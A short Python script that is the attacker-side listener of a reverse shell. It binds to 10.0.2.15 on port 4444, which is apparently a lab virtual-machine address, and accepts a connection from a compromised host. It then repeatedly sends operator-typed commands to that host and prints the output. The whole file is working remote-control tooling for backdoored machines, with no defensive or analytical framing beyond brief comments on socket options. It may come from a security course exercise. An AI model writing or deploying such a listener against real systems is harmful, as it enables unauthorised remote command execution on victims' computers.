#!/usr/bin/python

import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
# options to enable reuse of sockets, if connection drops etc.
listener.bind(("10.0.2.15", 4444))
# 0 is the backlog - no. of connections that can be queued before system starts refusing
listener.listen(0)
print("[+] Waiting for Incoming Connection")
connection, address = listener.accept()
print("[+] Got a Connection from " + str(address))

while True:
    command = input(">> ")
    connection.send(command.encode('utf-8'))
    result = connection.recv(1024)
    print(result)
